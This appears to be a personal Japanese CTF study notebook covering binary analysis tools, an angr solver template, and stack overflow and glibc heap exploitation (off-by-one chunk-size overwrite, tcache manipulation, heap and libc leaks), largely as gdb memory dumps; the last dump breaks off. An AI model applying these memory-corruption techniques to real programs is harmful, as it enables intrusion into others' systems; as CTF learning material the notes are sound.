<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [表層解析](#%E8%A1%A8%E5%B1%A4%E8%A7%A3%E6%9E%90)
- [動的解析](#%E5%8B%95%E7%9A%84%E8%A7%A3%E6%9E%90)
- [静的解析](#%E9%9D%99%E7%9A%84%E8%A7%A3%E6%9E%90)
  - [radare2](#radare2)
  - [gdb](#gdb)
    - [gdb-peda](#gdb-peda)
    - [gdb-pwndbg](#gdb-pwndbg)
    - [gdb-Pwndbg](#gdb-pwndbg)
    - [gdb-gef](#gdb-gef)
  - [Ghidra](#ghidra)
  - [angr](#angr)
- [exploit](#exploit)
  - [stack base BOF](#stack-base-bof)
  - [スタックアラインメント](#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%82%A2%E3%83%A9%E3%82%A4%E3%83%B3%E3%83%A1%E3%83%B3%E3%83%88)
  - [gadget](#gadget)
  - [off-by-one error](#off-by-one-error)
- [よく見るかたまり](#%E3%82%88%E3%81%8F%E8%A6%8B%E3%82%8B%E3%81%8B%E3%81%9F%E3%81%BE%E3%82%8A)
    - [関数の先頭](#%E9%96%A2%E6%95%B0%E3%81%AE%E5%85%88%E9%A0%AD)
    - [関数の終わり](#%E9%96%A2%E6%95%B0%E3%81%AE%E7%B5%82%E3%82%8F%E3%82%8A)
    - [strcmp](#strcmp)
    - [tcacheの通常時の動作](#tcache%E3%81%AE%E9%80%9A%E5%B8%B8%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
    - [tcacheの7つ埋めたあとにfastbinsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABfastbins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
    - [off-by-one-errorでchunk sizeを書き換えてヒープのleak](#off-by-one-error%E3%81%A7chunk-size%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%A6%E3%83%92%E3%83%BC%E3%83%97%E3%81%AEleak)
    - [off-by-one-errorとHeap leak+tcacheを7つリンク](#off-by-one-error%E3%81%A8heap-leaktcache%E3%82%927%E3%81%A4%E3%83%AA%E3%83%B3%E3%82%AF)
    - [Heap領域の上書きの利用](#heap%E9%A0%98%E5%9F%9F%E3%81%AE%E4%B8%8A%E6%9B%B8%E3%81%8D%E3%81%AE%E5%88%A9%E7%94%A8)
    - [Heap問のlibc leak](#heap%E5%95%8F%E3%81%AElibc-leak)
    - [Heap アドレス関係](#heap-%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E9%96%A2%E4%BF%82)
    - [覚えておきたい](#%E8%A6%9A%E3%81%88%E3%81%A6%E3%81%8A%E3%81%8D%E3%81%9F%E3%81%84)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## 表層解析
- file
- strings
- checksec.sh --file ./file
  - Full RELRO   
  プログラム起動時に共有ライブラリのアドレスをキャッシュ後にGOT領域をReadOnlyにする。GOT Overwriteできない
  - Partial RELRO   
  GOT領域は書き込み可能。GOT(Global Offset Table)は、共有ライブラリの関数のアドレスが保存された領域
  - No RELRO   
  GOT Overwrite可能。
  - ASLR   
  実行ファイルのスタックやヒープ、ライブラリをメモリに配置するときに、アドレスの一部をランダムに配置する   
  ランダム化されるのは、ヒープ・スタック・mmap(共有ライブラリ)で、実行ファイルが配置されるアドレスはランダム化されない。   
## 動的解析
- ./file (引数)   
引数を変えてみて、入力に対して出力が一対一かどうか確認
- strace ./file (引数)   
システムコールをトレースする
- ltrace ./file (引数)   
標準ライブラリ関数をトレースする
## 静的解析
### radare2
- radare2 ./binary
- afl   
関数の一覧を表示
- pdf @main   
main関数を逆アセンブル

### gdb
- disas main   
main関数を逆アセンブル
- x/(表示する数)(メモリサイズ bhwg)(表示フォーマット six)(表示するメモリの先頭アドレス *0x08...)   
  - b:BYTE(1バイト)   
  - h:HALFWORD(2バイト)   
  - w:WORD(4バイト)   
  - g:GIANTWORD(8バイト)   
  - s:文字列   
  - i:命令   
  - x:16進数   
  - 例) `x /4wx $rbp-0x90`   
  rbp-0x90のアドレスのメモリ上の値を表示   
  - 例) `x /4wi main+11`,`x /4wi $rip`   
  指定したアドレスから4つ分の命令を表示

#### gdb-peda
- `gdb-peda ./file`   

#### gdb-pwndbg
- `gdb-pendbg ./file`   
https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md   
#### gdb-Pwndbg
- `gdb-Pwndbg ./file`   
https://github.com/scwuaptx/Pwngdb   
#### gdb-gef
- `gdb-gef ./file`   
https://github.com/hugsy/gef   

### Ghidra
- `./ghirdaRun`   
でGhidraを起動。
- `[File]` -> `[import file]`でbinaryをインポート   
- `[Symbol Tree]`(左真ん中) -> `[Functions]`で関数を確認。ダブルクリックでそこに移動。   
- `[Decompile]`(右下) でコンパイル結果を表示
### angr
以下でInstall   
```txt
root@tomoki-VirtualBox:/opt# cd angr/
root@tomoki-VirtualBox:/opt/angr# virtualenv ENV
root@tomoki-VirtualBox:/opt/angr# . ENV/bin/activate
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install angr
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install -U protobuf
```
`(ENV) root@tomoki-VirtualBox:/opt/angr# python3 /home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/solver-angr.py 
`   
でangrスクリプトを実行して、解析してフラグを表示。   
以下、angrのテンプレート。

```python
import angr
from claripy import *

# バイナリのパスを指定
proj = angr.Project('/home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/mask')

# 8*40 でフラグの最大を40バイトに指定?(これがないと動かなかった)
sym_arg = BVS('sym_arg',8*40)

# mask というファイル名を指定
# state = proj.factory.entry_state()  でもyakisobaはいけた
argv=['mask',sym_arg]
state = proj.factory.entry_state(args=argv)
sm = proj.factory.simgr(state)

# find に Corrent  avoid に wrong という文字列の存在するアドレスを指定
# |      ||   0x000006d2      488d3d2e0a00.  lea rdi, str.Correct        ; 0x1107 ; "Correct!" ; const char *s
# radare2 の 0x6d2 + 0x400000 = 0x4006d2 などとしてアドレスを計算する
sm.explore(find=0x4012cf,avoid={0x4012dd,0x4011a9})

if sm.found:
    for i in sm.found:
        # yakisobaは以下で表示できた
        #print(i.posix.dumps(0))
        # これじゃないとフラグが出なかった
        print(i.solver.eval(sym_arg,cast_to=bytes).decode('utf-8','ignore'))

```
## exploit
### stack base BOF
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   
### スタックアラインメント
x86-64の場合、関数を呼び出すときには、`RSP`は必ず16の倍数のアドレスにいなければならない。   
リターンアドレスを書き換えて別の関数を呼び出す際に考慮する必要がある。   
もしそうでない場合、`ret`を入れたり、`push rbp`を無視して16の倍数にそろえる。 
以下は`ret`命令のアドレス`0x4007f0`をFunc1_ret領域に上書きした場合の動作。   
```txt
  4007f0:	c3                   	retq   
overW_ret = 0x4007f0
func_addr = win関数のアドレス

  ret 直前       ->       ret 直後           ->          ret gadget後
RIP = ret命令のアドレス  RIP = 0x4007f0                 RIP = win関数のアドレス
(Low)
|         |             |         |                    |         |
|   ...   |             |   ...   |                    |   ...   |
|   100h  |             |   100h  |                    |   100h  |
|   ...   |             |   ...   |                    |   ...   |
|saved_ebp| __ esp      |saved_ebp|                    |saved_ebp|
|overW_ret| (書き換えた) |overW_ret| (書き換えた) __ esp |overW_ret| (書き換えた)
|func_addr| (書き換えた) |func_addr| (書き換えた)        |func_addr| (書き換えた) __ esp
|  arg2   |             |  arg2   |                    |  arg2   |
|   ...   | __ ebp      |   ...   | __ ebp             |   ...   | __ ebp
|         |             |         |                    |         |
(High)
```
### gadget
### off-by-one error
read() で指定文字列を上限に読み込んだあと、ヌルバイト埋めが 1byte だけ溢れる脆弱性。   
Heap問でチャンクサイズを書き換えるのに有効。頻出？   
例)   
0x18サイズをreadに対して"A"\*0x18(24バイト)を入力すると、   
```txt
0x555555757350:	0x0000000000000000	0x0000000000000021 <- 0x20サイズのチャンクの先頭。free済み
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111  <- 0x20 chunkの後に0x110 chunkが存在

MENU
1. Alloc
2. Delete
3. Wipe
0. Exit
> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141 <- 0x20 chunkがtcache[0x20]から取り出されて
0x555555757370:	0x4141414141414141	0x0000000000000100 <- 0x111から0x100に変わった！！
                                                          これで0x100のtcacheをリンクできる！
```
## よく見るかたまり
#### 関数の先頭
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
push ebp
mov ebp, esp
sub esp, 100h
```
```txt
call 直前    ->     push ebp 直前  ->  mov ebp, esp 直前  -> sub esp, 100h 直前   ->  sub esp, 100h 直後
(Low)
|      |            |        |         |         |          |         |              |         | __ esp 
|      |            |        |         |         |          |         |              |   ...   | 
|      |            |        |         |         |          |         |              |   100h  |
|      |            |        |         |         | __ esp   |         | __ esp,ebp   |   ...   | __ ebp
|      |            |        | __ esp  |saved_ebp|          |saved_ebp|              |saved_ebp|
|      | __ esp     | F1_ret |         | F1_ret  |          | F1_ret  |              | F1_ret  |
| arg1 |            |  arg1  |         |  arg1   |          |  arg1   |              |  arg1   | 
| arg2 |            |  arg2  |         |  arg2   |          |  arg2   |              |  arg2   |
| ...  | __ ebp     |  ...   | __ ebp  |   ...   | __ ebp   |   ...   |              |   ...   |
|      |            |        |         |         |          |         |              |         |
(High)
```
#### 関数の終わり
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
...
mov esp,ebp
pop ebp
ret
```
```txt
mov esp,ebp 直前 -> pop ebp 直前        ->     ret 直前    ->     ret 直後   
(Low)
|         | __ esp  |         |             |         |         |         |
|   ...   |         |   ...   |             |   ...   |         |   ...   |
|   100h  |         |   100h  |             |   100h  |         |   100h  |
|   ...   | __ ebp  |   ...   | __ ebp,esp  |   ...   |         |   ...   |
|saved_ebp|         |saved_ebp|             |saved_ebp| __ esp  |saved_ebp|
| F1_ret  |         | F1_ret  |             | F1_ret  |         | F1_ret  | __ esp
|  arg1   |         |  arg1   |             |  arg1   |         |  arg1   |
|  arg2   |         |  arg2   |             |  arg2   |         |  arg2   |
|   ...   |         |   ...   |             |   ...   | __ ebp  |   ...   | __ ebp
|         |         |         |             |         |         |         |
(High)
```
#### strcmp
```txt
   0x55555555529e <main+293>:	lea    rax,[rbp-0x90]
   0x5555555552a5 <main+300>:	lea    rsi,[rip+0xd81]        # 0x55555555602d
   0x5555555552ac <main+307>:	mov    rdi,rax
=> 0x5555555552af <main+310>:	call   0x555555555070 <strcmp@plt>
   0x5555555552b4 <main+315>:	test   eax,eax
   0x5555555552b6 <main+317>:	jne    0x5555555552dd <main+356>
```
`RSI`レジスタと`RDI`レジスタに比較したい文字列を代入して、一致しているかを見る。一致していなければ、JNEで不一致の処理に入る。

#### tcacheの通常時の動作
[1] 0x10サイズをmalloc(content)して、`AAAAAAAABBBBBBBB`を書き込む。   
[2] 0x20サイズをmalloc(content)して、`DDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG`を書き込む。   
```txt
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE   <- ox20サイズのチャンクが作成された
Addr: 0x555555757250              0x21の1はPREV_INUSEで直前のチャンク(0x251)が既に使われていることを示す
Size: 0x21

Allocated chunk | PREV_INUSE   <- 0x30サイズのチャンクが作成された
Addr: 0x555555757270              0x31の1はPREV_INUSEで直前のチャンク(0x21)が既に使われていることを示す　
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins                <- free(content)されていないのでtcacheは存在しない
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021  <- 0x10サイズのchunkのtopのアドレス
0x555555757260:	0x4141414141414141	0x4242424242424242  <- 0x10サイズのmalloc(content)が返したアドレス
0x555555757270:	0x0000000000000000	0x0000000000000031  <- 0x20サイズのchunkのtopのアドレス
0x555555757280:	0x4444444444444444	0x4545454545454545  <- 0x20サイズのmalloc(content)が返したアドレス
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```

#### tcacheの7つ埋めたあとにfastbinsに入る動作
```txt
-------------------------------------------------------------
free(content)を7回繰り返した後

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x555555757280       <- 7回free(content)されておりリンクが最大の7個ある
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031
0x555555757280:	0x0000555555757280	0x4545454545454545 <- tcache[0x30]に入っている値(アドレス)
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (tcache) | PREV_INUSE                     <- tcacheに積まれる
Addr: 0x555555757270
Size: 0x31
fd: 0x555555757280                                   <- fdはtcache[0x30]の値で上書きされている

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg>

----------------------------------------------------------------------------
8回目の0x30サイズのfree(content)後

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (fastbins) | PREV_INUSE                   <- fastbinsに積まれた！ 
Addr: 0x555555757270                                 <- tcache[0x30]より0x10小さいアドレス
Size: 0x31
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x0               <- tcache[0x30]は7つ分を使い切った
fastbins
0x20: 0x0
0x30: 0x555555757270 ◂— 0x0                     <- 8個目は0x30のサイズが小さいのでfastbinsに積まれる
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031  <- fastbins[0x30]の値（アドレス）
0x555555757280:	0x0000000000000000	0x4545454545454545  <- tcache[0x30]の値（アドレス）
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```

#### off-by-one-errorでchunk sizeを書き換えてヒープのleak
off-by-one-errorでchunk sizeを書き換えて、tcacheを同じサイズをリンクすることで、ヒープのアドレスをleakする   
```txt
[1] 0x100サイズをmallocするようにしてfree (実際は0xf8(248)を要求) 
[2] 0x20サイズをmallocしてfree  (実際は0x18(24)を要求) 
[3] 0x110サイズをmallocしてfree (実際は0x108(264)を要求) 
[4] 0x20サイズを再度mallocして(実際は0x18)、0x18分をすべて埋めてoff-by-one-error
    0x20 chunkのすぐ下にある0x110 chunkのchunk sizeが0により、0x111→0x100に変わる
[5] 0x110サイズを再度mallocしてfree
    malloc時は0x110のtcache[0x110]の値(アドレス)を返し、その次のリンク(今はNULL)でtcache[0x110]を上書き
    free時に、malloc時に返されたアドレス-0x8の値(0x100)に対応するtcache[0x100]の値で、malloc時に返されたアドレスを上書き
    malloc時に返されたアドレスで、対応するtcache[0x100]の値を上書き
[6] show関数でmalloc時に返されたアドレスの値を表示できる
    今回はこのアドレスにはfree時に書き込まれたtcache[0x100]が値として存在
    
|   heap    heap |
|                |
|           0x101|
|                | <- tcache[0x100]
|                |
|                |
|    ~        ~  |
|                |
|           0x21 | 
|                | <- tcache[0x20]
|           0x111| <- ここを書き換える！！！
|                | <- tcache[0x110]
|                |
|                |

--------------------------------------------------------------
0x108サイズをmallocして、freeした後

tcachebins
0x20 [  1]: 0x555555757360 ◂— 0x0
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

pwndbg> x/16gx 0x555555757350
0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111
0x555555757380:	0x0000000000000000	0x0000000000000000

--------------------------------------------------------------
0x18サイズをmallocして、freeした後
この時、0x18サイズはすでにtcache[0x20]にあるので、tcache[0x20]の値(アドレス)が使われる！！
さらに下にHeapが伸びない！つまり下のやつを上書きできる！

> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

tcachebins
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021  
0x555555757360:	0x4141414141414141	0x4141414141414141  <- tcache[0x20]にあったアドレスを使った！
0x555555757370:	0x4141414141414141	0x0000000000000100  <- 0x100に変わった！
0x555555757380:	0x0000000000000000	0x0000000000000000

------------------------------------------------------------------
0x108サイズをmallocして、freeした後
mallocは0x108に対応した値tcache[0x110]=0x555555757380を返す

tcachebins
0x100 [  2]: 0x555555757380 —▸ 0x555555757260 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141
0x555555757370:	0x4141414141414141	0x0000000000000100
0x555555757380:	0x0000555555757260	0x0000000000000000 <- tcache[0x100]の値がfree時に書き込まれた！
                                     
-----------------------------------------------------------------
mallocで返されたアドレスの値を表示する

> 2
Content: '`ruUUU'    <- show関数でHeap領域のアドレス(0x0000555555757260)がリークできた！　
Remove? [y/n] n         showできるのはmallocが返したアドレス(0x108に対応するtcache[0x110]=0x555555757380)の値
```

#### off-by-one-errorとHeap leak+tcacheを7つリンク

```txt
[1] 0x100でmalloc,free (実際は248)
[2] 0x110でmalloc,free (実際は264)
[3] 0x120でmalloc,free (実際は280)
[4] 0x100で再度malloc,off-by-one-error,free
[5] 0x110で再度malloc,off-by-one-error,free
[6] 0x120で再度malloc,off-by-one-error,free
    この時、show関数で直前のmallocが返したアドレス470の値(360)を[6]のfree後に読むことでHeapleakできる！

[1],[2],[3]後                  [4],[5],[6]後

|   heap   heap   |          |   heap   heap   | 
|                 |          |                 |
|          0x100  |          |          0x100  |
|      0          | <- 260   | AAAAAA   AAAAA  |
|                 |          | AAAAAA   AAAAA  |
|                 |          |    ~         ~  |
|                 |          | AAAAAA   AAAAA  |
|          0x110  |          |          0x100  | <- [4]のoff-by-one-error
|      1          | <- 360   |  260     BBBBB  | <- [5]のfreeで、[4]でtcache[0x100]にfreeされた260が上書き
|                 |          | BBBBBB   BBBBB  |
|                 |          |    ~       ~    |
|                 |          | BBBBBB   BBBBB  |
|          0x120  |          | BBBBBB   0x100  | <- [5]のoff-by-one-error
|      2          | <- 470   |  360            | <- [6]のfreeで、[5]でtcache[0x100]にfreeされた360が上書き
|                 |          | CCCCCC   CCCCC  | <- [6]のoff-by-one-errorでこうなる。ここがmallocが返したアドレス

```
#### Heap領域の上書きの利用
上書きしたいアドレスがある場合、その上のチャンク(低位のチャンク)のchunk sizeを大きめに書き換えるなりしてfreeでtcacheに入れておけば、 次回書き換えたsizeと同じsizeをmallocしたときに(書き換えたいアドレスの上のチャンクが返る)、多めに上書きできるので、アドレスを上書きできる。   
例)
```txt
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- このアドレスに書き込みたい！
         
         しかし、mallocが0x555555757ab0を返しているときにこのままfreeすると、
         0x20sizeの呼び出し時にこのアドレスがtcache[0x20]から変えることになり、上書きするのにサイズが小さすぎる！
         
         ox21を0x41に何らかの方法で上書きすれば、mallocが0x555555757ab0を返しているときにfreeすると,
         tcache[0x40]にこのアドレスが入り、次に0x40sizeのmallocの時にこのアドレスが返るため、0x20sizeのチャンクに0x40size分書き込める！
```
#### Heap問のlibc leak
main_arenaのアドレスをリークして、offset_libc_arenaで引くとlibc_baseが求まる。   
main_arenaを使用するのはunsorted_binsなので、tcacheを7つ埋めてunsorted_binsを使う。   
unsorted_binsはfd,bkメンバを持ち、ここにはmain_arenaのアドレスが格納される。   
このアドレスをリークする。   
```txt
tcache[0x20] -> 0x20サイズのチャンクのアドレス -> (main_arenaのアドレスが格納されているアドレス)   
```
とすると、0x20のmalloc,freeを2セットすることでリークできる！   

そのサイズを次回mallocすれば
```txt
-------------------------------------------------------------------------
[1] 0x160サイズをmallocして"A"*0x138+p64(0x41)+p64(0x0000555555757a80)+p64(0x0000555555757a80)で上書きして、free
    0x41サイズの偽のチャンクを作成。
[2] 0x20サイズをmallocして"Y"*0x10+p64(0x40)+p64(0x100)で上書きして、free
    これで、0x555555757acのチャンクをfreeするときにchunkの結合が発生する

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
0x170 [  1]: 0x555555757ad0 ◂— 0x0
                                                  tcache[0x100]の0x555555757950は0x160サイズのチャンクを[1]でfreeした結果
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- [1] [2]の0x41と同じ出ないとダメ
0x555555757a90:	0x0000555555757a80	0x0000555555757a80 <- [1] consolidate時のunlink()でエラーとならないような値をセット
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959 <- [2] 0x20のmallocが返したアドレス。
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- [2] 0x40,0x100を書き込む (元0x170size)

-------------------------------------------------------------------------
0x170サイズのmalloc後　(0x555555757ac0がmallocに返された)
forward consolidateでエラーにならないように0x21の偽のチャンクを用意

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- このチャンクと結合されて、ここが0x141sizeのチャンクの先頭になる
0x555555757a90:	0x0000555555757a80	0x0000555555757a80    unsorted_binsはここを指すようになる
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- 0x100でPREV_INUSEがないので次のfree時にmalloc_consolidate()により、前のchunkと結合される
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x4141414141414141	0x0000000000000021 <- forward consolidateのため
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021 <- forward consolidateのため



-------------------------------------------------------------------------
0x170サイズのmalloc(0x555555757ac0をmallocに返された)のfree後

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80

0x555555757a80:	0x4141414141414141	0x0000000000000141 <- 0x41から0x141に変わった！ (0x141のchunkが作成された！)
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- fd,bkメンバにはmain_arenaのアドレス
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- ここをfreeしてbackward/forward consolidateが発生
0x555555757ad0:	0x4141414141414141	0x4141414141414141    ここのprev_size(0x40)+size(0x100)の合計が結合されて0x141のchunkが作成された！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------------
Input Size: 248
Input Content: 0

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80


0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000141
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
     ~                 ~                    ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021



----------------------------------------------------------------------------------------
0x40サイズをmallocして0x555555757a90を上書き(freeはしない)
unsorted_binsには0x140サイズのチャンクがあるので、0x140bytesのうち0x40だけ使う。
なので、unsorted_binsは0x555555757a80から0x555555757ac0に変わる。
(次にchunkが必要な時は0x555555757ac0から必要な分を切り取る)

mallocが返したアドレス0x555555757a90から書き込めるので、0x555555757ab0に0x0000555555757ad0を上書き
これで、0x0000555555757ad0にあるarena
以下の状況で、
[1] 0x20サイズのmalloc,free
[2] 0x20サイズのmalloc,free

tcachebins
0x20 [  1]: 0x555555757ab0 —▸ 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- 0x141から0x41に変わった！ もしfreeするとtcache[0x40]にこのチャンクが登録される
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0 <- mallocが返した0x555555757a90に書き込めるので
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- tcache[0x20]に0x555555757ad0のリンクを追加
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                  ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------
0x20サイズのmalloc後、freeはしない
この図の場合はfreeすると0x555555757ab0でtcache[0x20]が上書きれてしまうので良くない。freeはしない

tcachebins
0x20 [  0]: 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
